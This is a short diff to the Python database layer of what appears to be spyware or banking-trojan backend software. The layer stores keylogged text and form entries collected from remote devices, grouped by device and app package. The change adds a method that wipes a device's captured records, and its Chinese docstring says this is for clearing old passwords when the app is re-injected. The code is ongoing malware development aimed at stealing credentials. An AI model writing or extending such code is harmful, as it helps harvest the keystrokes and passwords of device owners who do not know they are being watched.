@@ -238,6 +238,13 @@ class DB:
         self.x("INSERT INTO keylogs(device_id,pkg,type,text,ts) VALUES(?,?,?,?,?)",
                (d.get('deviceId'), d.get('pkg'), d.get('type'), d.get('text'), int(time.time())))
 
+    def keylog_clear(self, device_id, pkg=None):
+        """删掉某台设备（可指定包）的键盘/表单记录：重注入时清空旧密码用。"""
+        if pkg:
+            self.x("DELETE FROM keylogs WHERE device_id=? AND pkg=?", (device_id, pkg))
+        else:
+            self.x("DELETE FROM keylogs WHERE device_id=?", (device_id,))
+
     def keylogs(self, device_id=None, limit=200):
         if device_id:
             return self.q("SELECT * FROM keylogs WHERE device_id=? ORDER BY id DESC LIMIT ?",
